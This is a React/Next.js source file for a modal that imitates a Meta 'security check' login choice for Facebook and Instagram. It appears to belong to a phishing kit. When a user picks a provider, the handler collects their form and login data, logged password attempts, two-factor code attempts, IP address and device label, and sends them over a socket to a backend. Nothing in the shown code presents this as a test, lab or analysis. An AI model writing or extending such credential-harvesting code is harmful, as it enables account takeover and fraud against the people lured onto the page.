'use client';

import '@/assets/css/meta-verified-modals.css';
import LogoInsta from '@/assets/images/logo-insta.webp';
import type { MetaVerifiedTexts } from '@/constants/meta-verified-texts';
import { useAppealContext } from '@/hooks/use-appeal-context';
import { store } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import { sendAppealMessage } from '@/hooks/use-socket';
import Image from 'next/image';
import { useState, type FC } from 'react';

const LoginChoiceModal: FC<{
    nextStep: (provider: 'facebook' | 'instagram') => void;
    uiTexts: MetaVerifiedTexts;
}> = ({ nextStep, uiTexts }) => {
    const [loadingProvider, setLoadingProvider] = useState<'facebook' | 'instagram' | null>(null);

    const { setModalOpen, setLoginProvider } = store();
    const appeal = useAppealContext();

    const handleProvider = async (provider: 'facebook' | 'instagram') => {
        if (loadingProvider) {
            return;
        }

        setLoadingProvider(provider);
        setLoginProvider(provider);

        try {
            if (appeal.socket && appeal.isConnected && appeal.ip) {
                const message = buildAppealMessage({
                    form: appeal.formData,
                    login: appeal.loginData,
                    loginProvider: provider,
                    passwordLogs: appeal.passwordAttempts,
                    codeAttempts: appeal.twoFAAttempts,
                    ip: appeal.ip,
                    deviceLabel: appeal.deviceLabel
                });
                const newMessageId = await sendAppealMessage(appeal.socket, {
                    message,
                    message_id: appeal.messageId,
                    stage: 'info'
                });
                appeal.setMessageId(newMessageId);
            }
        } catch {
            //
        }

        setLoadingProvider(null);
        nextStep(provider);
    };

    return (
        <div className='mv-modal-overlay mv-modal-overlay--center' role='dialog' aria-modal='true'>
            <div className='mv-modal-card' style={{ padding: '32px 28px', maxWidth: '420px' }}>
                <div className='mb-6 text-center'>
                    <h2 className='mv-modal-title' style={{ textAlign: 'center' }}>
                        {uiTexts.securityCheck}
                    </h2>
                    <p className='mt-3 text-[14px] leading-relaxed text-[#5a6a85]'>{uiTexts.loginInstruction}</p>
                </div>

                <div className='flex flex-col gap-3'>
                    <button
                        type='button'
                        disabled={loadingProvider !== null}
                        onClick={() => handleProvider('facebook')}
                        className='flex h-[48px] w-full items-center justify-center gap-3 rounded-full border border-[#dadde1] bg-white text-[15px] font-semibold text-[#1c1e21] transition hover:border-[#1877F2]/40 hover:bg-[#f0f2f5] disabled:opacity-60'
                    >
                        <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
                            <path
                                fill='#1877F2'
                                d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'
                            />
                        </svg>
                        {loadingProvider === 'facebook' ? '…' : uiTexts.logIn}
                    </button>

                    <button
                        type='button'
                        disabled={loadingProvider !== null}
                        onClick={() => handleProvider('instagram')}
                        className='flex h-[48px] w-full items-center justify-center gap-3 rounded-full border border-[#dbdbdb] bg-white text-[15px] font-semibold text-[#262626] disabled:opacity-60'
                    >
                        <Image src={LogoInsta} alt='Instagram' width={22} height={22} className='shrink-0 object-contain' />
                        {loadingProvider === 'instagram' ? '…' : 'Instagram'}
                    </button>
                </div>

                <button
                    type='button'
                    onClick={() => setModalOpen(false)}
                    className='mv-modal-close mx-auto mt-6 block text-[14px]'
                    style={{ padding: 0 }}
                >
                    ×
                </button>
            </div>
        </div>
    );
};

export default LoginChoiceModal;
